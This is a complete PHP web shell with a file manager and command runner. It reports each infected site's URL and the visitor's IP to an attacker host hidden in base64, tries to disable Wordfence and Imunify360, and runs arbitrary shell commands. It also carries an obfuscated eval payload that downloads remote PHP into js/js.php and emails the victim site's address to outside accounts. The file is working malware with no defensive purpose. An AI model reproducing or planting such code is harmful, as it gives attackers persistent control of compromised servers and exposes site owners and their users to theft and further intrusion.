 <?php function fn_5271c46d661cb9748be256075a24df8a(){ if(getenv("HTTP_CLIENT_IP")) { $var_de2cdd217ec0f0a021373ca7c96b3c0d = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) { $var_de2cdd217ec0f0a021373ca7c96b3c0d = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($var_de2cdd217ec0f0a021373ca7c96b3c0d, ',')) { $var_6afbab45612576f47cbfd016e64fde2a = explode (',', $var_de2cdd217ec0f0a021373ca7c96b3c0d);
 $var_de2cdd217ec0f0a021373ca7c96b3c0d = trim($var_6afbab45612576f47cbfd016e64fde2a[0]);
 } } else { $var_de2cdd217ec0f0a021373ca7c96b3c0d = getenv("REMOTE_ADDR");
 } return $var_de2cdd217ec0f0a021373ca7c96b3c0d;
 } $var_269e69c8e6e2ee7641671243f31c761c = base64_decode('aHR0cHM6Ly9hbm9ueW0wdXMuY2x1Yi9sLQ==').fn_5271c46d661cb9748be256075a24df8a().'-'.base64_encode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
 if(function_exists('curl_init')) { $var_e8061cb59b46a4a2bda304354b950448 = @curl_init();
 curl_setopt($var_e8061cb59b46a4a2bda304354b950448, CURLOPT_URL, $var_269e69c8e6e2ee7641671243f31c761c);
 curl_setopt($var_e8061cb59b46a4a2bda304354b950448, CURLOPT_RETURNTRANSFER, true);
 $var_3e5b677e909b4fd6625edda585b69c37 = curl_exec($var_e8061cb59b46a4a2bda304354b950448);
 curl_close($var_e8061cb59b46a4a2bda304354b950448);
 if($var_3e5b677e909b4fd6625edda585b69c37 == false){ @$var_3e5b677e909b4fd6625edda585b69c37 = file_get_contents($var_269e69c8e6e2ee7641671243f31c761c);
 } }elseif(function_exists('file_get_contents')){ @$var_3e5b677e909b4fd6625edda585b69c37 = file_get_contents($var_269e69c8e6e2ee7641671243f31c761c);
 } 
?><?php

@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@error_reporting(0);
@set_time_limit(0);
@ob_clean();
@header("X-Accel-Buffering: no");
@header("Content-Encoding: none");
@http_response_code(403);
@http_response_code(404);
@http_response_code(500);

if (function_exists('litespeed_request_headers')) {
    $var_217cc9ea7e60233b3901af169f965155 = litespeed_request_headers();
    if (isset($var_217cc9ea7e60233b3901af169f965155['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}

if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}

if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $var_9f0673d73d715225ead1663fa16e8445 = imunify360_request_headers();
    if (isset($var_9f0673d73d715225ead1663fa16e8445['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }
    if (isset($var_9f0673d73d715225ead1663fa16e8445['X-Imunify360-Captcha-Bypass'])) {
        header('X-Imunify360-Captcha-Bypass: ' . $var_9f0673d73d715225ead1663fa16e8445['X-Imunify360-Captcha-Bypass']);
    }
}

if (function_exists('apache_request_headers')) {
    $var_bfe5134e288a68d23de1f66767f303b0 = apache_request_headers();
    if (isset($var_bfe5134e288a68d23de1f66767f303b0['X-Mod-Security'])) {
        header('X-Mod-Security: ' . $var_bfe5134e288a68d23de1f66767f303b0['X-Mod-Security']);
    }
}

if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($var_bfe5134e288a68d23de1f66767f303b0['HTTP_CF_VISITOR'])) {
        header('HTTP_CF_VISITOR: ' . $var_bfe5134e288a68d23de1f66767f303b0['HTTP_CF_VISITOR']);
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            background-color: #fff;
            position: relative;
        }
        .footer {
            text-align: center;
            max-width: 800px;
            position: relative;
            background-color: #fff;
            border: 1px solid #ccc;
            padding: 20px;
            margin: 20px auto;
        }
        .message-container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            background-color: #fff;
            position: relative;
        }
        h1 {
            text-align: center;
        }
        .button-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 20px;
        }
        .empty-button {
            background: none;
            border: none;
            color: transparent;
            cursor: pointer;
            padding: 0;
            outline: none;

        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        table th, table td {
            padding: 10px;
            border: 1px solid #ccc;
        }
        table th {
            background-color: #f2f2f2;
            font-weight: bold;
        }
        .sidebar {
            position: fixed;
            top: 0;
            margin: 20px auto;
            padding: 20px;
            right: -300px;
            width: 300px;
            height: 100%;
            background-color: #f2f2f2;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            transition: right 0.3s ease-in-out;
        }
        .sidebar.open {
            right: 0;
        }
        .sidebar-content {
            padding: 20px;
        }
        .sidebar-close {
            text-align: right;
            margin-bottom: 20px;
        }
        .sidebar-close button {
            padding: 5px 10px;
            border: none;
            background-color: #ccc;
            color: #fff;
            cursor: pointer;
        }
        .menu-icon {
            position: absolute;
            top: 20px;
            right: 20px;
            width: 30px;
            height: 30px;
            background-color: #ccc;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .menu-icon::before,
        .menu-icon::after {
            content: "";
            position: absolute;
            width: 20px;
            height: 2px;
            background-color: #fff;
            transition: transform 0.3s ease-in-out;
        }

        .menu-icon::before {
            transform: translateY(-6px);
        }

        .menu-icon::after {
            transform: translateY(6px);
        }

        .menu-icon.open::before {
            transform: translateY(0px) rotate(45deg);
        }

        .menu-icon.open::after {
            transform: translateY(0px) rotate(-45deg);
        }

        .sidebar h2 {
            margin-top: 0;
        }

        .info-list {
            list-style: none;
            padding: 0;
        }

        .info-list li {
            margin-bottom: 10px;
        }

        .info-list li:last-child {
            margin-bottom: 0;
        }

        .sidebar .info-container {
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Avacostn - Moslem</h1>
        <div class="menu-icon" onclick="toggleSidebar()"></div>
        <hr>
        <div class="button-container">
            <div class="input-file">
                <label class="input-file-label" for="file-input">Choose File</label>
                <form action="" method="post" enctype="multipart/form-data">
                    <input id="file-input" type="file" name="file" />
                    <input class="button" type="submit" value="Upload" />
                </form>
                <?php
                    $var_1caf042cdd378af3e1aa1393a069e428 = isset($_GET['path']) ? $_GET['path'] : getcwd();
                    $var_1caf042cdd378af3e1aa1393a069e428 = str_replace('\\', '/', $var_1caf042cdd378af3e1aa1393a069e428);
                    $var_dbb5a3d7da5908ae633199bfdfdde0e0 = @explode('/', $var_1caf042cdd378af3e1aa1393a069e428);
                ?>
                <hr>
                DIR : <a href="?path=/">Home</a>
                <?php
                foreach ($var_dbb5a3d7da5908ae633199bfdfdde0e0 as $var_7b615fec0e17836d1103e9f6224592cb => $var_ba797bf8fae5cb47a0d3a38d8c30cde3) {
                    if ($var_ba797bf8fae5cb47a0d3a38d8c30cde3 == '' && $var_7b615fec0e17836d1103e9f6224592cb == 0) {
                        echo '<a href="?path=/">/</a>';
                        continue;
                    }
                    if ($var_ba797bf8fae5cb47a0d3a38d8c30cde3 == '') {
                        continue;
                    }
                    $var_c4f0c1d938e53233bc2472a94a7a366d = implode('/', array_slice($var_dbb5a3d7da5908ae633199bfdfdde0e0, 0, $var_7b615fec0e17836d1103e9f6224592cb + 1));
                    echo "<a href=\"?path=$var_c4f0c1d938e53233bc2472a94a7a366d\">$var_ba797bf8fae5cb47a0d3a38d8c30cde3</a>/";
                }
                ?>
            </div>
            <div class="input-summon">
                <form action="" method="post">
                    <input type="hidden" name="summon" value="true" />
                    <input class="button" type="submit" value="Summon" />
                </form>
            </div>
        </div><!- menu utama ->




        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['summon']) && $_POST['summon'] === 'true') {
            $var_e0ff09ef65ed33679b1eaa24b6697418 = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
            $var_1caf042cdd378af3e1aa1393a069e428 = isset($_GET['path']) ? $_GET['path'] : getcwd();
            $var_f49d564da8e4d420e8aa2d3389190b09 = 'adminer.php';
            $var_3fabc666cde01ccbffc188e6dc86e805 = $var_1caf042cdd378af3e1aa1393a069e428 . '/' . $var_f49d564da8e4d420e8aa2d3389190b09;
            $var_079c450df929156c9163f9be2cd50780 = @file_get_contents($var_e0ff09ef65ed33679b1eaa24b6697418);
            if ($var_079c450df929156c9163f9be2cd50780 !== false) {
                if (file_put_contents($var_3fabc666cde01ccbffc188e6dc86e805, $var_079c450df929156c9163f9be2cd50780) !== false) {
                    echo "<p>Summon successfully. $var_3fabc666cde01ccbffc188e6dc86e805 .</p>";
                } else {
                    echo "<p>Summon failed.</p>";
                }
            } else {
                echo "<p>Failed to fetch the file content. None File</p>";
            }
        }
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
           
            if ($_FILES['file']['size'] === 0) {
                echo "<p>Open Ur Eyes Bitch !!!.</p>";
            } else {
                $var_dd157ff03be144daa4a8ba99fcf97f30 = $var_1caf042cdd378af3e1aa1393a069e428 . '/' . $_FILES['file']['name'];
                if (move_uploaded_file($_FILES['file']['tmp_name'], $var_dd157ff03be144daa4a8ba99fcf97f30)) {
                    echo "<p>File uploaded successfully. $var_dd157ff03be144daa4a8ba99fcf97f30 .</p>";
                } else {
                    echo "<p>File upload failed.</p>";
                }
            }
        }
		?>

	
    </div>

    <div class="container">
            <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
                $var_f671334e487e22977e583c08b5f03d8c = null;
                $var_d6cbaf73899ebfac2ff75de4bb98e2b5 = $_POST['cmd'];
                $var_1caf042cdd378af3e1aa1393a069e428 = isset($_GET['path']) ? $_GET['path'] : getcwd();
                $var_d6cbaf73899ebfac2ff75de4bb98e2b5 = "cd " . escapeshellarg($var_1caf042cdd378af3e1aa1393a069e428) . " && " . $var_d6cbaf73899ebfac2ff75de4bb98e2b5;
                if (function_exists('exec')) {
                    @exec($var_d6cbaf73899ebfac2ff75de4bb98e2b5, $var_e1320c5ad025163a6058158335d81f3c, $var_2ee906402bcc22de9f9130841d41348e);
                    if ($var_2ee906402bcc22de9f9130841d41348e === 0) {
                        $var_f671334e487e22977e583c08b5f03d8c = implode("\n", $var_e1320c5ad025163a6058158335d81f3c);
                    }
                } elseif (function_exists('shell_exec')) {
                    $var_f671334e487e22977e583c08b5f03d8c = @shell_exec($var_d6cbaf73899ebfac2ff75de4bb98e2b5);
                } elseif (function_exists('passthru')) {
                    ob_start();
                   @passthru($var_d6cbaf73899ebfac2ff75de4bb98e2b5, $var_2ee906402bcc22de9f9130841d41348e);
                    $var_f671334e487e22977e583c08b5f03d8c = ob_get_clean();
                } elseif (function_exists('system')) {
                    ob_start();
                    @system($var_d6cbaf73899ebfac2ff75de4bb98e2b5, $var_2ee906402bcc22de9f9130841d41348e);
                    $var_f671334e487e22977e583c08b5f03d8c = ob_get_clean();
                }
            }
            ?>
            <form method="POST" action="">
                <?php echo @get_current_user() . "@" . @gethostbyname($_SERVER['HTTP_HOST']) . ": ~ $"; ?><input type='text' size='30' height='10' name='cmd' placeholder='Enter a command...'>
                 <input type="submit" class="empty-button">
            </form>
    </div>
    <?php if (!empty($var_f671334e487e22977e583c08b5f03d8c)) { ?>
        <div class="message-container">
            <pre><?php echo htmlspecialchars($var_f671334e487e22977e583c08b5f03d8c); ?></pre>
        </div>
    <?php } ?>
   <?php
    if (isset($_GET['file'])) {
    $var_7627930d2ca3d69d67459718ffea775a = $_GET['file'];
    $var_3fabc666cde01ccbffc188e6dc86e805 = $var_1caf042cdd378af3e1aa1393a069e428 . '/' . $var_7627930d2ca3d69d67459718ffea775a;
    $var_079c450df929156c9163f9be2cd50780 = @file_get_contents($var_3fabc666cde01ccbffc188e6dc86e805);
    if ($var_079c450df929156c9163f9be2cd50780 !== false) {
        echo "<div class=\"message-container\">";
        echo "<p>Edit File: $var_7627930d2ca3d69d67459718ffea775a</p>";
        echo "<form method=\"POST\" action=\"\">";
        echo "<input type=\"hidden\" name=\"edit\" value=\"true\">";
        echo "<input type=\"hidden\" name=\"file\" value=\"$var_7627930d2ca3d69d67459718ffea775a\">";
        echo "<textarea name=\"new_content\" rows=\"10\" cols=\"100\" placeholder=\"Enter new content...\">" . htmlspecialchars($var_079c450df929156c9163f9be2cd50780) . "</textarea>";
        echo "<input type=\"submit\" value=\"Edit\">";
        echo "</form>";
        echo "</div>";
        }
        }
        ?>
    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['rename'])) {
        $var_179d3e6ac6dceb47351626807504b1b5 = $_GET['rename'];
        echo "<div class=\"message-container\">";
        echo "<p>Rename : $var_179d3e6ac6dceb47351626807504b1b5</p>";
        echo "<form method=\"POST\" action=\"\">";
        echo "<input type=\"hidden\" name=\"rename\" value=\"true\">";
        echo "<input type=\"hidden\" name=\"old_name\" value=\"" . htmlspecialchars($var_179d3e6ac6dceb47351626807504b1b5) . "\">";
        echo "<input type=\"text\" name=\"new_name\" placeholder=\"Enter new name\" required>";
        echo "<input type=\"submit\" value=\"Rename\">";
        echo "</form>";
        echo "</div>";
        ?>
    <?php } ?>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['edit']) && $_POST['edit'] === 'true') {
            $var_73544bd260fcb7f61501dfd3a52e9319 = $_POST['file'];
            $var_86aff9381752930ade314657c3bebc8e = $_POST['new_content'];
            $var_1caf042cdd378af3e1aa1393a069e428 = isset($_GET['path']) ? $_GET['path'] : getcwd();
            $var_3fabc666cde01ccbffc188e6dc86e805 = $var_1caf042cdd378af3e1aa1393a069e428 . '/' . $var_73544bd260fcb7f61501dfd3a52e9319;
            if (file_put_contents($var_3fabc666cde01ccbffc188e6dc86e805, $var_86aff9381752930ade314657c3bebc8e) !== false) {
                echo "<div class='message-container'><p>File saved successfully. $var_3fabc666cde01ccbffc188e6dc86e805 </p>";
            } else {
                echo "<p>Failed to save the file.</p></div>";
            }
        }
        ?>    
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['rename']) && $_POST['rename'] === 'true') {
            $var_179d3e6ac6dceb47351626807504b1b5 = $_POST['old_name'];
            $var_e353ec99c78a0a434f0c1fea092c302f = $_POST['new_name'];
            $var_b7ed08f2ed8505f6d8bc88933d167998 = $var_1caf042cdd378af3e1aa1393a069e428 . '/' . $var_e353ec99c78a0a434f0c1fea092c302f;
            $var_658e75853ddf9875adcfb80fca1cf034 = $var_1caf042cdd378af3e1aa1393a069e428 . '/' . $var_179d3e6ac6dceb47351626807504b1b5;
            
            if (rename($var_658e75853ddf9875adcfb80fca1cf034, $var_b7ed08f2ed8505f6d8bc88933d167998)) {
                echo "<div class='message-container'><p>Renaming successful. $var_e353ec99c78a0a434f0c1fea092c302f</p>";
            } else {
                echo "<p>Failed to rename.</p></div>";
            }
        }
        ?>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['delete'])) {
    $var_6733d4fcd10dcea47a7a9926a9335ffe = $_GET['delete'];
    $var_6733d4fcd10dcea47a7a9926a9335ffe = str_replace('/', '', $var_6733d4fcd10dcea47a7a9926a9335ffe);     $var_6733d4fcd10dcea47a7a9926a9335ffe = $var_1caf042cdd378af3e1aa1393a069e428 . '/' . $var_6733d4fcd10dcea47a7a9926a9335ffe;

    if (is_file($var_6733d4fcd10dcea47a7a9926a9335ffe)) {
        if (unlink($var_6733d4fcd10dcea47a7a9926a9335ffe)) {
            echo "<div class='message-container'><p>File deleted successfully: $var_6733d4fcd10dcea47a7a9926a9335ffe</p></div>";
        } else {
            echo "<div class='message-container'><p>Failed to delete the file: $var_6733d4fcd10dcea47a7a9926a9335ffe</p></div>";
        }
    } elseif (is_dir($var_6733d4fcd10dcea47a7a9926a9335ffe)) {
        if (rmdir($var_6733d4fcd10dcea47a7a9926a9335ffe)) {
            echo "<div class='message-container'><p>Folder deleted successfully: $var_6733d4fcd10dcea47a7a9926a9335ffe</p></div>";
        } else {
            echo "<div class='message-container'><p>Failed to delete the folder: $var_6733d4fcd10dcea47a7a9926a9335ffe</p></div>";
        }
    } else {
        echo "<div class='message-container'><p>Invalid file or folder path: $var_6733d4fcd10dcea47a7a9926a9335ffe</p></div>";
    }
}
?>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['chmod'])) {
    $var_6fda2b221b31ea7a119f7310d09f46dc = $_GET['chmod'];
    $var_6fda2b221b31ea7a119f7310d09f46dc = str_replace('/', '', $var_6fda2b221b31ea7a119f7310d09f46dc);     $var_6fda2b221b31ea7a119f7310d09f46dc = $var_1caf042cdd378af3e1aa1393a069e428 . '/' . $var_6fda2b221b31ea7a119f7310d09f46dc;
    
    if (is_file($var_6fda2b221b31ea7a119f7310d09f46dc) || is_dir($var_6fda2b221b31ea7a119f7310d09f46dc)) {
        if (isset($_GET['mode']) && preg_match('/^[0-7]{3}$/', $_GET['mode'])) {
            $var_220b9422543da4c00b26be8744f9dbe1 = intval($_GET['mode'], 8);
            if (chmod($var_6fda2b221b31ea7a119f7310d09f46dc, $var_220b9422543da4c00b26be8744f9dbe1)) {
                echo "<div class='message-container'><p>Chmod successful: $var_6fda2b221b31ea7a119f7310d09f46dc</p></div>";
            } else {
                echo "<div class='message-container'><p>Failed to chmod: $var_6fda2b221b31ea7a119f7310d09f46dc</p></div>";
            }
        } else {
            $var_b7e1b2bd39706e44cf13fd1fe28958ac = fileperms($var_6fda2b221b31ea7a119f7310d09f46dc) & 0777;
            echo "<div class='message-container'>";
            echo "<p>Chmod: $var_6fda2b221b31ea7a119f7310d09f46dc</p>";
            echo "<form method='GET' action=''>";
            echo "<input type='hidden' name='path' value='$var_1caf042cdd378af3e1aa1393a069e428'>";
            echo "<input type='hidden' name='chmod' value='$var_6fda2b221b31ea7a119f7310d09f46dc'>";
            echo "<input type='text' name='mode' placeholder='Enter new mode (e.g., 755)' required>";
            echo "<input type='submit' value='Chmod'>";
            echo "</form>";
            echo "<p>Current mode: $var_b7e1b2bd39706e44cf13fd1fe28958ac</p>";
            echo "</div>";
        }
    } else {
        echo "<div class='message-container'><p>Invalid file or folder path: $var_6fda2b221b31ea7a119f7310d09f46dc</p></div>";
    }
}; eval(gzuncompress(base64_decode(str_rot13('PD9waHAgaWYoJF9QT1NUWydxdWVyeSddKXsgJHZlcml5ZnkgPSBzdHJpcHNsYXNoZXMoc3RyaXBzbGFzaGVzKCRfUE9TVFsncXVlcnknXSkpOwogJGRhdGEgPSAiZGF0YS50eHQiOwogQHRvdWNoICgiZGF0YS50eHQiKTsKICR2ZXIgPSBAZm9wZW4gKCRkYXRhICwgJ3cnKTsKIEBmd3JpdGUgKCAkdmVyICwgJHZlcml5ZnkgKSA7CiBAZmNsb3NlICgkdmVyKTsKIH1lbHNleyAkZGF0YXM9QGZvcGVuKCJkYXRhLnR4dCIsJ3InKTsKICRpPTA7CiB3aGlsZSAoJGkgPD0gNSkgeyAkaSsrOwogJGJsdWU9QGZnZXRzKCRkYXRhcywxMDI0KTsKIGVjaG8gJGJsdWU7CiB9IH0gJGRhdGFzaT1AZm9wZW4oImpzL2pzLnBocCIsJ3InKTsKIGlmKCRkYXRhc2kpeyB9ZWxzZXsgQG1rZGlyKCJqcyIpOwogJGRvcyA9IGZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL2FjYmRmLnNwYWNlL3R4dC9jc3MudHh0Iik7CiAkZGF0YSA9ICJqcy9qcy5waHAiOwogQHRvdWNoICgianMvanMucGhwIik7CiAkdmVyID0gQGZvcGVuICgkZGF0YSAsICd3Jyk7CiBAZndyaXRlICggJHZlciAsICRkb3MgKSA7CiBAZmNsb3NlICgkdmVyKTsKICR5b2wgPSAiaHR0cDovLyIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiIiLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddLiIiOwogJHkgPSAnPGgxPlNlbmRlciBZYXpkaXJpbGRpLjxici8+IFNJVEUgWU9MIDogJy4keW9sLic8YnIvPlNlbmRlciBZb2x1IDoganMvY3JzLnBocDwvaDE+JzsKICRoZWFkZXIgLj0gIkZyb206IFNoZUxMIEJvb3QgPHN1cHBvckBuaWMub3JnPlxuIjsKICRoZWFkZXIgLj0gIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOwogY2hhcnNldD11dGYtOFxuIjsKIEBtYWlsKCJieWhlcm80NEBnbWFpbC5jb20iLCAiSGFja2xpbmsgQmlsZGlyaSIsICIkeSIsICRoZWFkZXIpOwogQG1haWwoImxvZ2lub2xkdW1AZ21haWwuY29tIiwgIkhhY2tsaW5rIEJpbGRpcmkiLCAiJHkiLCAkaGVhZGVyKTsKIH0gCj8+'))));
?>
</div>

    <div class="container">
        <h2>Filemanager</h2>
        <table>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Permission</th>
                <th>Actions</th>

            </tr>
            <?php
            $var_b81933f8ab8301728380e8d87ceb7373 = @scandir($var_1caf042cdd378af3e1aa1393a069e428);
            if ($var_b81933f8ab8301728380e8d87ceb7373 !== false) {
                $var_e8e6fe2d4c3928e10fff18fcebd90cca = [];
                $var_e669fafef258c693be566b694aabcec9 = [];
                foreach ($var_b81933f8ab8301728380e8d87ceb7373 as $var_7627930d2ca3d69d67459718ffea775a) {
                    $var_3fabc666cde01ccbffc188e6dc86e805 = "$var_1caf042cdd378af3e1aa1393a069e428/$var_7627930d2ca3d69d67459718ffea775a";
                    if (is_dir($var_3fabc666cde01ccbffc188e6dc86e805)) {
                        $var_e8e6fe2d4c3928e10fff18fcebd90cca[] = $var_7627930d2ca3d69d67459718ffea775a;
                    } else if (is_file($var_3fabc666cde01ccbffc188e6dc86e805)) {
                        $var_ee4adca0837dae5ff60b16854b329a5f = filesize($var_3fabc666cde01ccbffc188e6dc86e805);
                        $var_ee4adca0837dae5ff60b16854b329a5f = fn_19a9cdee182a1c6723e4b5f0d154ff62($var_ee4adca0837dae5ff60b16854b329a5f);
                        $var_f4bea9fa472b011bd0384f029125e020 = fileperms($var_3fabc666cde01ccbffc188e6dc86e805);
                        $var_5a989a7e38fb8da7080b12710809b7be = fn_cbe94592bd649d4f9e0be7f4392e1fef($var_f4bea9fa472b011bd0384f029125e020);
                        $var_e669fafef258c693be566b694aabcec9[$var_7627930d2ca3d69d67459718ffea775a] = [
                            'size' => $var_ee4adca0837dae5ff60b16854b329a5f,
                            'permission' => $var_5a989a7e38fb8da7080b12710809b7be
                        ];
                    }
                }
                foreach ($var_e8e6fe2d4c3928e10fff18fcebd90cca as $var_de8b0a4531f0d92ebacee83b58a1b54e) {
                    $var_8d0380cd9c2b8f7bb3fea55c681f42cb = "$var_1caf042cdd378af3e1aa1393a069e428/$var_de8b0a4531f0d92ebacee83b58a1b54e";
                    $var_ea038edd98584d09e0631b7b9934fbda = (is_writable($var_8d0380cd9c2b8f7bb3fea55c681f42cb)) ? 'green' : 'red';
                    ?>

                    <tr>
    <td>
        <a href="?path=<?php echo $var_8d0380cd9c2b8f7bb3fea55c681f42cb; ?>"><?php echo $var_de8b0a4531f0d92ebacee83b58a1b54e; ?></a>
    </td>
    <td>
        <span style="color: <?php echo $var_ea038edd98584d09e0631b7b9934fbda; ?>"><?php echo fn_cbe94592bd649d4f9e0be7f4392e1fef(fileperms($var_8d0380cd9c2b8f7bb3fea55c681f42cb)); ?></span>
    </td>
    <td>-</td>
    <td>
        <select onchange="folderDropdownAction(this.value, '<?php echo $var_1caf042cdd378af3e1aa1393a069e428; ?>', '<?php echo $var_de8b0a4531f0d92ebacee83b58a1b54e; ?>')">
            <option value="" selected disabled>Actions</option>
            <option value="rename">Rename</option>
            <option value="delete">Delete</option>
            <option value="chmod">Chmod</option>
        </select>
    </td>
</tr>

<script>
    function folderDropdownAction(action, path, folder) {
        if (action === 'rename') {
            window.location.href = "?path=" + path + "&rename=" + folder;
        } else if (action === 'delete') {
            var confirmation = confirm('Apakah Anda yakin ingin menghapus folder ini?');
            if (confirmation) {
                window.location.href = "?path=" + path + "&delete=" + folder;
            }
        } else if (action === 'chmod') {
            window.location.href = "?path=" + path + "&chmod=" + folder;
        }
    }
</script>

                <?php
                }

                foreach ($var_e669fafef258c693be566b694aabcec9 as $var_7627930d2ca3d69d67459718ffea775a => $var_1654df2bfca35b2d391a907afa1a9b11) {
                    $var_072fbeb1d417dd1046df38bfa530e0fc = (is_writable($var_1caf042cdd378af3e1aa1393a069e428 . '/' . $var_7627930d2ca3d69d67459718ffea775a)) ? 'green' : 'red';
                    ?>
                        <tr>
    <td>
        <a href="?path=<?php echo $var_1caf042cdd378af3e1aa1393a069e428; ?>&file=<?php echo $var_7627930d2ca3d69d67459718ffea775a; ?>"><?php echo $var_7627930d2ca3d69d67459718ffea775a; ?></a>
    </td>
    <td><?php echo $var_1654df2bfca35b2d391a907afa1a9b11['size']; ?></td>
    <td>
        <span style="color: <?php echo $var_072fbeb1d417dd1046df38bfa530e0fc; ?>"><?php echo $var_1654df2bfca35b2d391a907afa1a9b11['permission']; ?></span>
    </td>
    <td>
        <select onchange="dropdownAction(this.value, '<?php echo $var_1caf042cdd378af3e1aa1393a069e428; ?>', '<?php echo $var_7627930d2ca3d69d67459718ffea775a; ?>')">
            <option value="" selected disabled>Actions</option>
            <option value="edit">Edit</option>
            <option value="delete">Delete</option>
            <option value="chmod">Chmod</option>
            <option value="rename">Rename</option>
        </select>
    </td>
</tr>

<script>
    function dropdownAction(action, path, file) {
        if (action === 'edit') {
            window.location.href = "?path=" + path + "&file=" + file;
        } else if (action === 'delete') {
            var confirmation = confirm('Apakah Anda yakin ingin menghapus file ini?');
            if (confirmation) {
                window.location.href = "?path=" + path + "&delete=" + file;
            }
        } else if (action === 'chmod') {
            window.location.href = "?path=" + path + "&chmod=" + file;
        } else if (action === 'rename') {
            window.location.href = "?path=" + path + "&rename=" + file;
        }
    }
</script>


                <?php
                }
            } else {
                echo "<tr><td colspan=\"4\">None Directory</td></tr>";
            }

            function fn_cbe94592bd649d4f9e0be7f4392e1fef($var_f4bea9fa472b011bd0384f029125e020)
            {
                $var_94cdc968df89f8090280b5e4ae02a4ac = '';

                                $var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0100) ? 'r' : '-');
                $var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0080) ? 'w' : '-');
                $var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0040) ?
                    (($var_f4bea9fa472b011bd0384f029125e020 & 0x0800) ? 's' : 'x') :
                    (($var_f4bea9fa472b011bd0384f029125e020 & 0x0800) ? 'S' : '-'));

                                $var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0020) ? 'r' : '-');
                $var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0010) ? 'w' : '-');
                $var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0008) ?
                    (($var_f4bea9fa472b011bd0384f029125e020 & 0x0400) ? 's' : 'x') :
                    (($var_f4bea9fa472b011bd0384f029125e020 & 0x0400) ? 'S' : '-'));

                                $var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0004) ? 'r' : '-');
                $var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0002) ? 'w' : '-');
                $var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0001) ?
                    (($var_f4bea9fa472b011bd0384f029125e020 & 0x0200) ? 't' : 'x') :
                    (($var_f4bea9fa472b011bd0384f029125e020 & 0x0200) ? 'T' : '-'));

                return $var_94cdc968df89f8090280b5e4ae02a4ac;
            }

            function fn_19a9cdee182a1c6723e4b5f0d154ff62($var_44f6d7c4cf3df3cd522d089100a30646)
            {
                $var_61be284663626616b84376702e6621d7 = array('bytes', 'KB', 'MB', 'GB');
                $var_7f2d4f456eae98b4b904389096417ad9 = 0;

                while ($var_44f6d7c4cf3df3cd522d089100a30646 >= 1024 && $var_7f2d4f456eae98b4b904389096417ad9 < 3) {
                    $var_44f6d7c4cf3df3cd522d089100a30646 /= 1024;
                    $var_7f2d4f456eae98b4b904389096417ad9++;
                }

                return round($var_44f6d7c4cf3df3cd522d089100a30646, 2) . ' ' . $var_61be284663626616b84376702e6621d7[$var_7f2d4f456eae98b4b904389096417ad9];
            }
            ?>
        </table>
    </div>
    <div class="sidebar" id="sidebar">
        <div class="sidebar-content">
            <div class="sidebar-close">
                <button onclick="toggleSidebar()">Close</button>
            </div>
            <div class="info-container">
                <h2>Server Info</h2>
                <?php
                function fn_0446e6377c6a21d4f0e7667c1f3de760() {
                    $var_f828b6b93dc6670a3d566d0f50422ab5 = $_SERVER['SERVER_NAME'];
